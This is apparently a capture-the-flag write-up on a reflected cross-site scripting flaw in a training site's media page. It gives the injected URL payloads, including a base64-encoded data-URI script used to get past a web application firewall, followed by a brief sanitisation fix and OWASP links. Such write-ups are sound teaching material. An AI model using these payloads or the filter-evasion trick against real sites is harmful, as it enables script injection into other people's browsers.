# XSS_REFLECTED

### Breach Exploit
In the home page we found an image clickable.

Here we can see this in the url:

```
/?page=media&src=nsa
```

When we set the value of src to 'test' we have an image "wrong answer" and the parameter is stored here:

```
<object data="test"></object>
```

We can execute some javascript using:
 
```
/?page=media&src=data:text/html, <script>alert("xss")</script>
```

But we don't get the flag. We use base64 with the same payload to avoid WAF and that works:

```
/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik7PC9zY3JpcHQ=
```
### Fix Breach
Avoid to use url data without proper validation, always sanitize input
```https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html```

### Documentation
```https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html```
```https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/waf-bypass```
